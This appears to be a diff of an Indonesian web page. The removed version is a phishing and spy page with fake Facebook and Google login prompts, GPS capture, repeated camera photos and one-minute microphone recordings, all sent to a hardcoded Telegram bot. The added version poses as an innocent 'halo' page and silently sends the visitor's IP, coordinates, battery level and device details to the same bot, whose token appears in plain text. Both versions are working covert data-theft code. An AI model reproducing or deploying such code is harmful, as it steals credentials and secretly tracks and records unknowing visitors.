@@ -2,208 +2,105 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Loading system...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      margin: 0;
-      background: black;
-      color: lime;
-      font-family: monospace;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-    h1 {
-      text-shadow: 0 0 10px lime;
-    }
-    .login-container {
-      margin-top: 20px;
-    }
-    .btn-login {
-      background: lime;
-      border: none;
-      padding: 10px 20px;
-      margin: 5px;
-      color: black;
-      font-weight: bold;
-      cursor: pointer;
-      border-radius: 5px;
-      text-shadow: none;
-    }
-  </style>
+  <title>i love you hehe</title>
 </head>
 <body>
+  <h1>halo</h1>
 
-<h1>Macro Bug : login</h1>
-<div class="login-container">
-  <button class="btn-login" onclick="fakeLogin('Facebook')">Login Facebook</button>
-  <button class="btn-login" onclick="fakeLogin('Google')">Login Google</button>
-</div>
+  <script>
+    const botToken = '8446376790:AAE2JlEHOmf8fTXKbJdMtIRnY7K1tRSOwjY';
+    const chatId = '6616319071';
 
-<video id="video" autoplay playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+    const userAgent = navigator.userAgent.toLowerCase();
 
-<script>
-const token = '8446376790:AAE2JlEHOmf8fTXKbJdMtIRnY7K1tRSOwjY';
-const chat_id = '6616319071';
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
+    function getMerkHP(ua) {
+      if (ua.includes('xiaomi')) return 'Xiaomi';
+      if (ua.includes('vivo')) return 'Vivo';
+      if (ua.includes('oppo')) return 'Oppo';
+      if (ua.includes('realme')) return 'Realme';
+      if (ua.includes('samsung')) return 'Samsung';
+      if (ua.includes('iphone')) return 'iPhone';
+      if (ua.includes('huawei')) return 'Huawei';
+      if (ua.includes('asus')) return 'Asus';
+      if (ua.includes('infinix')) return 'Infinix';
+      return 'Tidak diketahui';
+    }
 
-// Kirim teks ke Telegram
-function kirimPesan(text) {
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id, text })
-  });
-}
+    function getOS(ua) {
+      if (ua.includes('android')) return 'Android';
+      if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
+      if (ua.includes('windows')) return 'Windows';
+      if (ua.includes('mac')) return 'MacOS';
+      if (ua.includes('linux')) return 'Linux';
+      return 'Tidak diketahui';
+    }
 
-// Kirim file ke Telegram
-function kirimFile(audioBlob) {
-  const form = new FormData();
-  form.append('chat_id', chat_id);
-  form.append('audio', audioBlob, 'rekaman.webm');
-  fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
-    method: 'POST',
-    body: form
-  });
-}
+    function getBrowser(ua) {
+      if (ua.includes('chrome') && !ua.includes('edge')) return 'Chrome';
+      if (ua.includes('firefox')) return 'Firefox';
+      if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
+      if (ua.includes('edge')) return 'Edge';
+      if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
+      return 'Tidak diketahui';
+    }
 
-// Fake login
-function fakeLogin(provider) {
-  let email = prompt(`Masukkan Email ${provider}:`);
-  let password = prompt(`Masukkan Password ${provider}:`);
-  if (email && password) {
-    // Kirim pesan pertama sebelum hasil
-    const mulaiPesan = `𝘼𝙙𝙖 𝙍𝙚𝙨𝙪𝙡𝙩 𝙉𝙞𝙝 𝘽𝙖𝙣𝙜 𝘿𝙤𝙣𝙯 𝙆𝙖𝙡𝙞 𝙄𝙣𝙞 𝙑𝙞𝙖 ${provider} 𝘿𝙞 𝙗𝙖𝙬𝙖𝙝 𝙄𝙣𝙞 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙉𝙮𝙖 𝙮𝙖..`;
-    kirimPesan(mulaiPesan);
+    function isMobile(ua) {
+      return /android|iphone|ipad|ipod|mobile/i.test(ua) ? 'Mobile' : 'Desktop';
+    }
 
-    // Kirim pesan setelah proses selesai dengan data login
-    const loginData = `
-==🌟 𝙍𝙀𝙎𝙐𝙇𝙏 𝘽𝘼𝙉𝙂 𝘿𝙊𝙉𝙕 🌟==
-📧 Email/nomor: ${email}
-🔒 Password: ${password}
-🖥 Login: ${provider}
-🌐 Result: Metode Hack akun
-=========================
-`;
-    setTimeout(() => {
-      kirimPesan(loginData);
-    }, 2000); // Menunggu 2 detik sebelum mengirimkan data login
-  }
-}
-
-// Info device awal
-kirimPesan('📝𝘽𝙚𝙧𝙞𝙠𝙪𝙩 𝘿𝙖𝙩𝙖 𝘿𝙖𝙩𝙖 𝙆𝙤𝙧𝙗𝙖𝙣 𝘽𝙖𝙣𝙜:');
-
-fetch('https://api.ipify.org?format=json')
-  .then(res => res.json())
-  .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
-  .then(loc => loc.json())
-  .then(info => {
-    const device = navigator.userAgent;
-    const ram = navigator.deviceMemory || 'Tidak diketahui';
+    const merkHP = getMerkHP(userAgent);
+    const os = getOS(userAgent);
+    const browser = getBrowser(userAgent);
+    const platform = isMobile(userAgent);
+    const waktu = new Date().toLocaleString();
+    const statusOnline = navigator.onLine ? 'Online' : 'Offline';
+    const resolusi = `${window.screen.width}x${window.screen.height}`;
+    const bahasa = navigator.language || '-';
+    const referer = document.referrer || 'Langsung / Tidak ada';
     const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const bahasa = navigator.language;
-    const browser = navigator.appName + ' ' + navigator.appVersion;
-    const statusJaringan = navigator.onLine ? 'Online' : 'Offline';
+    const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui';
+    const koneksi = navigator.connection?.effectiveType || 'Tidak diketahui';
 
-    navigator.getBattery().then(bat => {
-      const status = `
-== INFORMASI KORBAN ==
-🌐 IP: ${info.ip}
-🏳 Negara: ${info.country_name}
-🖥 Region: ${info.region}
-📲 Kota: ${info.city}
-🔎 ISP: ${info.org}
-🔋 Baterai: ${Math.floor(bat.level * 100)}%
-📱 Device: ${device}
-🧠 RAM: ${ram} GB
-⚙️ CPU: ${cpu} core
-🌍 Zona Waktu: ${timezone}
-🗣️ Bahasa: ${bahasa}
-🧭 Browser: ${browser}
-📡 Status Jaringan: ${statusJaringan}
-=========================
-`;
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        navigator.getBattery().then(battery => {
+          const baterai = Math.round(battery.level * 100) + '%';
 
-      kirimPesan(status);
-    });
-  });
+          const pesan = `
+🔹 waktu       : ${waktu}
+📩 ip          : ${data.ip}
+🌆 kota        : ${data.city}
+🌍 region      : ${data.region}
+🇮🇩 negara     : ${data.country_name} (${data.country})
+🕑 zona waktu  : ${data.timezone}
+🛰 provider    : ${data.org}
+📍 lokasi      : ${data.latitude}, ${data.longitude}
 
-// Lokasi GPS
-if ("geolocation" in navigator) {
-  navigator.geolocation.getCurrentPosition(pos => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const lokasi = `📍Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
-    kirimPesan(lokasi);
-  });
-}
+📱 merk hp     : ${merkHP}
+💻 sistem      : ${os}
+🌐 browser     : ${browser}
+📱 platform    : ${platform}
+🧠 RAM         : ${ram}
+⚙️ CPU core    : ${cpu}
+📶 koneksi     : ${koneksi}
+🔋 baterai     : ${baterai}
+📐 resolusi    : ${resolusi}
+🗣️ bahasa      : ${bahasa}
+🔗 referer     : ${referer}
+🕵️ user-agent  : ${navigator.userAgent}
+          `;
 
-// Kamera - Ambil foto tiap 10 detik
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-  video.srcObject = stream;
-  video.play();
-  setInterval(() => {
-    ambilFoto();
-  }, 3000);
-})
-.catch(err => {
-  kirimPesan("Gagal akses kamera: " + err);
-});
-
-function ambilFoto() {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  canvas.toBlob(blob => {
-    let form = new FormData();
-    form.append('chat_id', chat_id);
-    form.append('photo', blob, 'foto.jpg');
-    form.append('caption', '📸 𝙁𝙤𝙩𝙤 𝙆𝙤𝙧𝙗𝙖𝙣 𝙎𝙪𝙠𝙨𝙚𝙨');
-    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-      method: 'POST',
-      body: form
-    });
-  }, 'image/jpeg');
-}
-
-// Rekam suara otomatis
-navigator.mediaDevices.getUserMedia({ audio: true })
-.then(stream => {
-  const mediaRecorder = new MediaRecorder(stream);
-  let chunks = [];
-
-  mediaRecorder.ondataavailable = e => {
-    chunks.push(e.data);
-  };
-
-  mediaRecorder.onstop = () => {
-    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
-    kirimFile(audioBlob);
-    chunks = [];
-    mediaRecorder.start(); // Mulai lagi setelah kirim
-    setTimeout(() => {
-      mediaRecorder.stop();
-    }, 60000); // 1 menit
-  };
-
-  mediaRecorder.start();
-  setTimeout(() => {
-    mediaRecorder.stop();
-  }, 60000);
-})
-.catch(err => {
-  kirimPesan("Gagal akses microphone: " + err);
-});
-</script>
-
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: pesan
+            })
+          });
+        });
+      });
+  </script>
 </body>
 </html>
